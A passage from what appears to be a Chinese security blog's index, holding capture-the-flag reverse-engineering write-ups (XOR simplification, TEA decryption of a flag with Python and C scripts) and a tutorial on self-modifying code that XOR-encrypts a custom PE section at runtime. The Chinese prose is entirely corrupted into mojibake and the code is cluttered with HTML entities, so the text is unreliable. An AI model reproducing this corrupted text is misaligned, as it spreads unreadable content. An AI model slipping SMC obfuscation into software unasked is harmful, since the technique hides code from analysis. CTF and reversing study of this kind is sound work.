è¿™ä¸ªé¢˜åšå¾—å¯ä»¥è¯´æ˜¯ç›¸å½“æ²¡æœ‰ä½“éªŒäº†ï¼Œçœ‹åˆ°ä¸€å †é—ªçç‹—çœ¼çš„ä¸œè¥¿åç«‹é©¬å°±æ»šå›å»è¡¥ä½œä¸šäº†\nè§‚èµäº†è¡¨å“¥ä»¬çš„wpåæˆ‘æ‰å‘ç°é‚£å †xæ‰æ˜¯äºŒç»´ç çš„æœ¬ä½“ï¼ˆæˆ‘ä¸€ç›´ä»¥ä¸ºè‰²å—æ˜¯äºŒç»´ç çš„ç»„æˆéƒ¨åˆ†ï¼‰\nä¸­é—´äº§ç”Ÿéšæœºæ•°æ¥ç¡®å®šè¦ä¸è¦æ‰“å°xï¼Œæ‰€ä»¥æŠŠéšæœºæ•°åˆ¤æ–­éƒ¨åˆ†patchæ‰å°±å¥½äº†\nä¸ºé˜²æ­¢æ‰‹è´±å‰é¢çš„å±å¹•åˆ·æ–°patchæ‰\nç„¶åè¿è¡Œå°±ä¼šå¾—åˆ°è¿™ç§ä¸œè¥¿\nå¤åˆ¶å‡ºæ¥æ‰«ä¸€ä¸‹\n`BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR}\nå®æ˜¯æ¥å‡ºmiscçš„å§\nlog1cal # æ‹–è¿›idaåŠ¨è°ƒä¸€ä¸‹å…ˆåˆ¤æ–­æ ¼å¼å’Œé•¿åº¦\nBJD{64ä¸ªå­—ç¬¦}\nç„¶ååé¢çš„ä½ç§»æ“ä½œæ²¡ä»€ä¹ˆéš¾çš„ï¼Œåªæœ‰é‡ç‚¹åœ¨åŠ å¯†ä¸Šé¢\nå¤´çš®å‘éº»çš„åŠ å¯†ï¼š # for ( i = 0; i \u0026lt;= 63; ++i ) { *flag = flag[1] \u0026amp; ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) | ~(((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)) \u0026amp; flag[1]) \u0026amp; ((*flag \u0026lt;\u0026lt; 28) \u0026amp; ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) | ~((*flag \u0026gt;\u0026gt; 36) \u0026amp; (*flag \u0026lt;\u0026lt; 28)) \u0026amp; (*flag \u0026gt;\u0026gt; 36)); flag[1] = flag[2] \u0026amp; ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) | ~(((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)) \u0026amp; flag[2]) \u0026amp; ((flag[1] \u0026lt;\u0026lt; 22) \u0026amp; ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) | ~((flag[1] \u0026gt;\u0026gt; 42) \u0026amp; (flag[1] \u0026lt;\u0026lt; 22)) \u0026amp; (flag[1] \u0026gt;\u0026gt; 42)); flag[2] = flag[3] \u0026amp; ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) | ~(((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)) \u0026amp; flag[3]) \u0026amp; ((flag[2] \u0026lt;\u0026lt; 16) \u0026amp; ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) | ~((flag[2] \u0026gt;\u0026gt; 48) \u0026amp; (flag[2] \u0026lt;\u0026lt; 16)) \u0026amp; (flag[2] \u0026gt;\u0026gt; 48)); flag[3] = flag[4] \u0026amp; ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) | ~(((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)) \u0026amp; flag[4]) \u0026amp; ((flag[3] \u0026lt;\u0026lt; 58) \u0026amp; ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) | ~((flag[3] \u0026gt;\u0026gt; 6) \u0026amp; (flag[3] \u0026lt;\u0026lt; 58)) \u0026amp; (flag[3] \u0026gt;\u0026gt; 6)); flag[4] = flag[5] \u0026amp; ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) | ~(((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)) \u0026amp; flag[5]) \u0026amp; ((flag[4] \u0026lt;\u0026lt; 52) \u0026amp; ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) | ~((flag[4] \u0026gt;\u0026gt; 12) \u0026amp; (flag[4] \u0026lt;\u0026lt; 52)) \u0026amp; (flag[4] \u0026gt;\u0026gt; 12)); flag[5] = flag[6] \u0026amp; ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) | ~(((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)) \u0026amp; flag[6]) \u0026amp; ((flag[5] \u0026lt;\u0026lt; 46) \u0026amp; ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) | ~((flag[5] \u0026gt;\u0026gt; 18) \u0026amp; (flag[5] \u0026lt;\u0026lt; 46)) \u0026amp; (flag[5] \u0026gt;\u0026gt; 18)); flag[6] = flag[7] \u0026amp; ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) | ~(((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)) \u0026amp; flag[7]) \u0026amp; ((flag[6] \u0026lt;\u0026lt; 40) \u0026amp; ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) | ~((flag[6] \u0026gt;\u0026gt; 24) \u0026amp; (flag[6] \u0026lt;\u0026lt; 40)) \u0026amp; (flag[6] \u0026gt;\u0026gt; 24)); flag[7] = *flag \u0026amp; ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) | ~(((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)) \u0026amp; *flag) \u0026amp; ((flag[7] \u0026lt;\u0026lt; 34) \u0026amp; ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) | ~((flag[7] \u0026gt;\u0026gt; 30) \u0026amp; (flag[7] \u0026lt;\u0026lt; 34)) \u0026amp; (flag[7] \u0026gt;\u0026gt; 30)); v6 = 1; } ä½†æ˜¯æˆ‘ä»¬æŠŠæ¯ä¸€ä¸ªç®—å¼æ‹†æˆä¸‹é¢çš„å½¢å¼ï¼š\na = flag\u0026lt;\u0026lt;n1 b = flag\u0026gt;\u0026gt;n2 *flag = flag[1] \u0026amp; ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) | ~((a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b) \u0026amp; flag[1]) \u0026amp; (a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b); å¯ä»¥å‘ç°(a \u0026amp; ~(b \u0026amp; a) | ~(b \u0026amp; a) \u0026amp; b)æ˜¯ä½œä¸ºä¸€ä¸ªæ•´ä½“å‡ºç°çš„ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯ a^b çš„å€¼ åŒ–ç®€å\n*flag = flag[1] \u0026amp; ~((a^b)\u0026amp; flag[1]) | ~((a^b) \u0026amp; flag[1]) \u0026amp; (a^b);\nåˆå‘ç°æ•´ä¸ªç®—å¼å°±æ˜¯åˆšæ‰çš„é‚£ä¸ªç»“æ„ï¼Œäºæ˜¯æŠŠåŠ å¯†è¿›è¡Œç®€åŒ–ä¸º\nflag[0]=(a^b)^flag[1]\nå†åŠ ä¹‹aå’Œbçš„ä¸¤ä¸ªä½ç§»æŒ‡æ­£å¥½æ˜¯64ï¼Œè¿™æ ·å°±å¯ä»¥å¼€å§‹é€†äº†\nDemo: # import hashlib l = [0x08CD53D0EAE56FDE,0xE0310C8244BA1FA3,0x45B42002CE1B213D,0x16FDC411224CB2DF,0x2FD8108A59461BCC,0x8F6990725EB01982,0x9BA5ADE29A2A17D8,0x4DEAA99F5D9F6605] n1 = [] n2 = [] for i in range(64): l[7] = ((l[7] ^ l[0]) \u0026gt;\u0026gt; 34) \u0026amp; 0xffffffffffffffff ^ (((l[7] ^ l[0])) \u0026lt;\u0026lt; 30) \u0026amp; 0xffffffffffffffff l[6] = ((l[6] ^ l[7]) \u0026gt;\u0026gt; 40) \u0026amp; 0xffffffffffffffff ^ (((l[6] ^ l[7])) \u0026lt;\u0026lt; 24) \u0026amp; 0xffffffffffffffff l[5] = ((l[5] ^ l[6]) \u0026gt;\u0026gt; 46) \u0026amp; 0xffffffffffffffff ^ (((l[5] ^ l[6])) \u0026lt;\u0026lt; 18) \u0026amp; 0xffffffffffffffff l[4] = ((l[4] ^ l[5]) \u0026gt;\u0026gt; 52) \u0026amp; 0xffffffffffffffff ^ (((l[4] ^ l[5])) \u0026lt;\u0026lt; 12) \u0026amp; 0xffffffffffffffff l[3] = ((l[3] ^ l[4]) \u0026gt;\u0026gt; 58) \u0026amp; 0xffffffffffffffff ^ (((l[3] ^ l[4])) \u0026lt;\u0026lt; 6) \u0026amp; 0xffffffffffffffff l[2] = ((l[2] ^ l[3]) \u0026gt;\u0026gt; 16) \u0026amp; 0xffffffffffffffff ^ (((l[2] ^ l[3])) \u0026lt;\u0026lt; 48) \u0026amp; 0xffffffffffffffff l[1] = ((l[1] ^ l[2]) \u0026gt;\u0026gt; 22) \u0026amp; 0xffffffffffffffff ^ (((l[1] ^ l[2])) \u0026lt;\u0026lt; 42) \u0026amp; 0xffffffffffffffff l[0] = ((l[0] ^ l[1]) \u0026gt;\u0026gt; 28) \u0026amp; 0xffffffffffffffff ^ (((l[0] ^ l[1])) \u0026lt;\u0026lt; 36) \u0026amp; 0xffffffffffffffff s=\u0026#39;\u0026#39; for i in l: t = i while t\u0026gt;0: s+=chr(t%0x100) t = t//0x100 flag =\u0026#39;\u0026#39; s1 = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; s2 = \u0026#39;456789+/YZabcdefopqrstuvwxyz0123ghijklmnABCDEFGHQRSTUVWXIJKLMNOP\u0026#39; for i in s1: flag += s[s2.find(i)] print(flag) # easy_logical_algorithm_for_freshman_and_try_to_slove_it_yourself m=hashlib.md5() m.update(bytes(flag,encoding=\u0026#34;utf-8\u0026#34;)) print(m.hexdigest().upper()) #A6FFB35FEF107F2A0DAAE19BCD7B2297 å…¶å®åœ¨çœ‹åˆ°åŠ å¯†éƒ¨åˆ†åªæœ‰ä¸ã€æˆ–ã€éçš„æ—¶å€™å°±åº”è¯¥å¾€ä¸ã€æˆ–ã€éå®ç°å¼‚æˆ–çš„æ–¹å‘æƒ³äº†ï¼Œå› ä¸ºæ²¡æœ‰åŠ å‡ä¹˜é™¤çš„å‚ä¸ï¼Œå•çº¯çš„ä¸ã€æˆ–ã€éå¾ˆéš¾æŠŠflagé€†å›æ¥\nPy2 # pycæ–‡ä»¶å¾ˆå®Œæ•´,å¯ä»¥ç›´æ¥ç”¨å·¥å…·åå‡ºæ¥,æ‹¿åˆ°æºç æ˜¯è¿™æ ·çš„\ndemoï¼š # #! /usr/bin/env python 2.7 (62211) #coding=utf-8 # Compiled at: 2020-04-23 03:22:50 #Powered by BugScaner #http://tools.bugscaner.com/ #å¦‚æœè§‰å¾—ä¸é”™,è¯·åˆ†äº«ç»™ä½ æœ‹å‹ä½¿ç”¨å§! import ctypes from base64 import b64encode, b64decode def decode(): fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;rb\u0026#39;) data = fd.read() fd.close() print(123) fd = open(\u0026#39;./libc.so\u0026#39;, \u0026#39;wb\u0026#39;) fd.write(b64decode(data)) fd.close() def check(): if b64encode(pwd) == \u0026#39;YmpkMw==\u0026#39;: # bjd3 decode() dl = ctypes.cdll.LoadLibrary lib = dl(\u0026#39;./libc.so\u0026#39;) reply = lib.check reply(int(flag[:length // 2], 16), int(flag[length // 2:], 16), int(pwd.encode(\u0026#39;hex\u0026#39;), 16)) print \u0026#39;your input is BJD\u0026#39; flag.decode(\u0026#39;hex\u0026#39;) else: print \u0026#39;your password is wrong!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: print \u0026#39;Please input your flag:\u0026#39; flag = raw_input() flag = flag.encode(\u0026#39;hex\u0026#39;) length = len(flag) print \u0026#39;Please input your password:\u0026#39; pwd = raw_input() check() #decode() åˆ†æä¸€ä¸‹æµç¨‹å¯ä»¥å‘ç°ä»£ç è°ƒç”¨äº† libc.so åŠ¨æ€é“¾æ¥åº“é‡Œé¢çš„cheakå‡½æ•°è¿›è¡ŒåŠ å¯†\npyæºç å¥½å°±å¥½åœ¨å¯ä»¥å¯¹æµç¨‹éšæ„ä¿®æ”¹,æˆ‘ä»¬è®©ç¨‹åºå¯¹æ–‡ä»¶è§£base64åå¾—åˆ° libc.soé‡Œé¢çš„cheakå‡½æ•°æ˜¯é•¿è¿™æ ·çš„\ncheakå‡½æ•° # v3 = a1; v7 = a2; v6 = a2; v5 = a2; v4 = a2; code((unsigned __int64 *)\u0026amp;v3, \u0026amp;v4); if ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) ) puts(\u0026#34;you win!\u0026#34;); else puts(\u0026#34;you failed!\u0026#34;); codeå‡½æ•°: # v4 = *a1; v5 = a1[1]; sum = 0LL; v7 = 32LL; while ( 1 ) { v2 = v7--; if ( !v2 ) break; sum += 0x9E3779B9LL; v4 += (v5 + sum) ^ (16 * v5 + *key) ^ ((v5 \u0026gt;\u0026gt; 5) + key[1]); v5 += (v4 + sum) ^ (16 * v4 + key[2]) ^ ((v4 \u0026gt;\u0026gt; 5) + key[3]); } *a1 = v4; codeå‡½æ•°å†…æ˜¯æ ‡å‡†çš„teaåŠ å¯†,æ—©çŸ¥é“åŠ å¯†æ–¹å¼è¿™ä¹ˆç®€å•æˆ‘å°±å…ˆæ¥åšpy2äº†ã€‚ã€‚ã€‚\nä½†æ˜¯åå‡ºæ¥çš„è¿™è¡Œä»£ç åˆå¾ˆå¥‡æ€ªif ( v3 == __PAIR128__(0xD760262509C2F6D0LL, 0xAF9D869B6947017DLL) )äºæ˜¯å¹²è„†çœ‹æ±‡ç¼–ç¡®å®šåˆ¤æ–­æ—¶çš„ç»†èŠ‚\nå¯ä»¥ç¡®å®š\n0xAF9D869B6947017D,0xD760262509C2F6D0\nå¯¹åº”ç¬¬1ã€2ä¸ªflag\nteaçš„è§£å¯†è„šæœ¬å¾ˆå¥½å†™ï¼Œä½†æ˜¯è¦æ³¨æ„é¢˜ç›®ç”¨çš„æ˜¯64ä½int\nexp: # #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;iomanip\u0026gt; using namespace std; void decrypt(unsigned __int64 *v, unsigned __int64 *k) { unsigned __int64 v4 = v[0], v5 = v[1], v2 = v[2], v3 = v[3], sum = 0; unsigned __int64 k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (int i = 0; i \u0026lt; 32; i++) { sum += 0x9E3779B9; } for (int i = 0; i \u0026lt; 32; i++) { v5 -= ((v4 * 16) + k2) ^ (v4 + sum) ^ ((v4 \u0026gt;\u0026gt; 5) + k3); v4 -= ((v5 * 16) + k0) ^ (v5 + sum) ^ ((v5 \u0026gt;\u0026gt; 5) + k1); sum -= 0x9E3779B9; } v[0] = v4; v[1] = v5; } int main() { unsigned __int64 flag[2] = { 0xAF9D869B6947017D,0xD760262509C2F6D0}; unsigned __int64 key[4] = {0x626a6433, 0x626a6433, 0x626a6433, 0x626a6433}; decrypt(flag, key); for (auto \u0026amp;\u0026amp;i : flag) { cout \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; i\u0026lt;\u0026lt; endl; } system(\u0026#34;pause\u0026#34;); return 0; } //676f745f //74656121 æŠŠç»“æœè½¬æˆå­—ç¬¦ä¸²\ngot_tea!\nè¿™å‡ ä¸ªreé™¤äº†ä¸¤ä¸ªmiscç¡®å®éš¾åº¦æ„Ÿè§‰éƒ½æ¯”è¾ƒé€‚ä¸­ã€‚ã€‚ã€‚åº”è¯¥æŠŠæ‰€æœ‰é¢˜éƒ½çœ‹ä¸€éçš„\n","date":"26 May 2020","permalink":"/achieve/2019to2021/dasctf-2020-5/","section":"archive","summary":"æˆ‘å°±æ˜¯é“åºŸç‰©äº†ï¼Œæ•´åœºæ¯”èµ›åªåšå‡ºæ¥ä¸¤ä¸ªé¢˜","title":"å®‰æ’äº”æœˆèµ›-2020-reéƒ¨åˆ†"},{"content":"\rVC6å®ç°SMCåŠ¨æ€ä»£ç åŠ å¯†æŠ€æœ¯ # è‡ªå·±åšreç»å¸¸ç¢°åˆ°smcï¼ŒæŠ˜è…¾ä¹…äº†ä¹Ÿä¼šæ‰‹ç—’ç—’è‡ªå·±å¼„ä¸€ä¸ªï¼Œç®—æ˜¯å¯¹PEç»“æ„çš„å·©å›ºã€‚ã€‚ã€‚æŠ€æœ¯æœ¬èº«ä¹Ÿä¸å¤ªéš¾æ‡‚ï¼ŒæŠ˜è…¾å®Œå‘ç°ä¹Ÿæ²¡å¼„å‡ºå•¥æœ‰æŠ€æœ¯å«é‡çš„ä¸œè¥¿ï¼Œå°±ç®—ä½œå­¦ä¹ åŠ å¯†æŠ€æœ¯çš„ä¸€ä¸ªå¼€ç«¯å§\né¢„å¤‡çŸ¥è¯†ï¼š # peç»“æ„\nCè¯­è¨€åŠŸåº•\næ·»åŠ åŒºå—ï¼š # ç›¸å¯¹æ±‡ç¼–ç¼–å†™smcï¼ŒCè¯­è¨€ç¼–å†™smcä¸€å¤§ç¼ºç‚¹å°±æ˜¯éš¾ä»¥å‡†ç¡®å®šä½åˆ°æŸä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¦ç”¨åˆ°æ·»åŠ æ®µçš„æ“ä½œï¼Œä»¥åŒºå—ä¸ºåŠ å¯†å•ä½ï¼Œæ‰€ä»¥è®²è¦åŠ å¯†çš„ä»£ç æ”¾åˆ°ä¸€ä¸ªæ–°åŒºå—ä¸­\n#pragma code_seg(\u0026#34;.SMC\u0026#34;) void fun() {\tputs(\u0026#34;You got my secrets =.= \\n\u0026#34;); } #pragma code_seg() #pragma comment(linker, \u0026#34;/SECTION:.SMC,ERW\u0026#34;) #pragma code_seg(\u0026quot;.SMC\u0026quot;) è¡¨ç¤ºå°†ä»£ç æ”¾å…¥ .SMC æ®µä¸­\nåé¢è¿˜è¦è·Ÿä¸€ä¸ª #pragma code_seg( ) æ˜¯ä¸ºäº†æŠŠå…¶ä½™ä»£ç æ”¾å…¥åŸæœ¬çš„æ®µä¸­\n#pragma comment(linker, \u0026ldquo;/SECTION:.SMC,ERW\u0026rdquo;) è®¾ç½®æ®µçš„å±æ€§ä½å¯è¯»å†™ï¼Œæ²¡æœ‰è¿™ä¸€æ­¥ä¹Ÿå¯ä»¥ç”¨ VirtualProtect è¿›è¡Œä¿®æ”¹\nè¿è¡Œç¨‹åºåº”è¯¥çœ‹åˆ°fun()æ˜¯å¯ä»¥æ­£å¸¸è¿è¡Œçš„,è‹¥ä½¿ç”¨ vs20xx å¯èƒ½éœ€è¦ä¿®æ”¹ä¸€ä¸‹ç¼–è¯‘çš„è®¾ç½®æ‰èƒ½æˆåŠŸç”Ÿæˆæ–°æ®µ\nå®šä½åŒºå—ï¼š # é¦–å…ˆéœ€è¦å®šä½åˆ°é•œåƒæ–‡ä»¶çš„åŸºå€\nHMODULE pBuf = GetModuleHandle(0); é€šè¿‡åŸºæ‰¾åˆ°ç¨‹åºçš„ DOS å¤´(PIMAGE_DOS_HEADER ç±»å‹)ï¼Œå†é€šè¿‡ DOS å¤´æ‰¾åˆ° PE æ–‡ä»¶å¤´(PIMAGE_NT_HEADERS32 ç±»å‹)ï¼š\npDH = (PIMAGE_DOS_HEADER)pBuf; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBuf + pDH-\u0026gt;e_lfanew); åˆ©ç”¨ PE æ–‡ä»¶å¤´æ‰¾åˆ°ç¬¬ä¸€ä¸ªæ®µå’Œæ®µçš„æ€»æ•°ï¼š\nSnum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); é€šè¿‡éå†æ¯ Snum ä¸ªæ®µå¯¹æ¯”æ®µçš„ name å°±å¯ä»¥å®šä½åˆ°æƒ³è¦çš„æ®µäº†ã€‚\né›†åˆä¸Šè¿°æ–¹æ³•ç¼–å†™äº†ä¸€ä¸ªæŸ¥æ‰¾æŒ‡å®šåŒºæ®µçš„å‡½æ•°ï¼š\nPIMAGE_SECTION_HEADER get_SH(char s[]) { char name[10]; int Snum; HMODULE pBase = GetModuleHandle(0); PIMAGE_DOS_HEADER pDH; PIMAGE_NT_HEADERS pNtH; PIMAGE_SECTION_HEADER pSH; pDH = (PIMAGE_DOS_HEADER)pBase; pNtH = (PIMAGE_NT_HEADERS32)((DWORD)pBase + pDH-\u0026gt;e_lfanew); Snum = pNtH-\u0026gt;FileHeader.NumberOfSections; pSH = IMAGE_FIRST_SECTION(pNtH); for(int i = 0;i\u0026lt;Snum;i++) { memset(name,0,sizeof(name)); memcpy(name,pSH-\u0026gt;Name,8); if(strcmp(name,s)==0) return pSH; pSH++; } cout\u0026lt;\u0026lt;\u0026#34;sth worry!\\n\u0026#34;; system(\u0026#34;pause\u0026#34;); return pSH; } å¯¹ä»£ç è¿›è¡Œæ“ä½œï¼š # å¯¹ä»£ç çš„æ“ä½œæœ‰ä¸€ç‚¹éº»çƒ¦ï¼Œç”¨ä¸Šé¢å¾—åˆ°çš„ç›®æ ‡æ®µå¾—åˆ°æ®µé¦–çš„åç§»å†åŠ ä¸Šæ˜ åƒæ–‡ä»¶çš„åŸºå€å¾—åˆ°å®šä½åˆ°çœŸæ­£çš„æ®µé¦–åœ°å€ã€‚\nç„¶åå…ˆæŠŠä»£ç å¼€å§‹çš„ä½ç½®è½¬æˆä¸€ä¸ª void ç±»å‹çš„æŒ‡é’ˆï¼Œå†æŠŠæ•°æ®è½¬æˆ BYTE ç±»å‹è¾“å‡ºã€‚\nvoid axor(void *soure,int len,int key) {\tprintf(\u0026#34;è¯»å–æ•°æ®ï¼š\\n\u0026#34;); for(int i=0;i\u0026lt;len;i++) printf(\u0026#34;%X\\n\u0026#34;,*((BYTE*)soure+i));//*((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; }//æ®µæ“ä½œå‡½æ•° . . . . void *Start = GetModuleHandle(0) + SH-\u0026gt;VirtualAddress; int size = SH-\u0026gt;SizeOfRawData; axor( soure, size, 4396)ï¼›//ä»£ç é•¿åº¦å¯èƒ½åªå æ®µå¾ˆå°ä¸€éƒ¨åˆ†,æ‰€ä»¥ size çš„å€¼è§†æƒ…å†µè€Œå®š æ‰“å°å‡ºæ¥é¢‡æœ‰ä¸€ç§ä¸€ä½ä½è¯»å–æœºå™¨ç çš„æ•ˆæœã€‚\nç¼–å†™èµ‹å€¼è¯­å¥å°è¯•å¯¹æœºå™¨ç çš„å€¼è¿›è¡Œä¿®æ”¹ï¼ŒåŠ¨è°ƒæŸ¥çœ‹æµç¨‹ç¡®è®¤æ— è¯¯ååŠ å…¥ key å¯¹ä»£ç è¿›è¡ŒåŠ å¯†\nvoid axor(void *soure,int len,int key {\tfor(int i=0;i\u0026lt;len;i++) *((BYTE*)soure+i) = *((BYTE*)soure+i) ^ key; } åˆ©ç”¨å¼‚æˆ–ä»¥å¤–çš„åŠ å¯†æ–¹å¼å¯ä»¥æé«˜ smc çš„å¨åŠ›\næŠŠå„ä¸ªæ­¥éª¤æ•´åˆåˆ°ä¸€èµ·ï¼Œç¼–è¯‘\nä½†æ˜¯ç¼–è¯‘å¥½çš„ä»£ç å¹¶æ²¡æœ‰å¯¹æ•æ„Ÿä»£ç è¿›è¡ŒåŠ å¯†ï¼Œäºæ˜¯æˆ‘ä»¬è¿˜éœ€è¦ç›´æ¥å¯¹ç”Ÿæˆå¥½çš„ pe æ–‡ä»¶åŠ¨åˆ€ï¼Œæ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªæœ‰æ‰¾åˆ°ä½ç½®ä¸€ä¸ªä¸ª BYTE æ”¹å°±okäº†ï¼Œè¿™é‡Œæˆ‘åšäº†ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„ demo ï¼Œå› ä¸ºä»£ç ä¸å¤ªé•¿ï¼Œæ‰€ä»¥è¯•äº†è¯•ç›´æ¥ç”¨ winhex ä¸€ä½ä½æŠ ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚ã€‚ã€‚ã€‚\næœ€åæŠŠå†™å¥½çš„ç¨‹åºæ”¾åœ¨è¿™é‡Œï¼š\rsmc1 å¯†ç æ˜¯ï¼š2077 smc è¿˜æ˜¯è¦é…åˆä¸Šå…¶ä»–åŠ 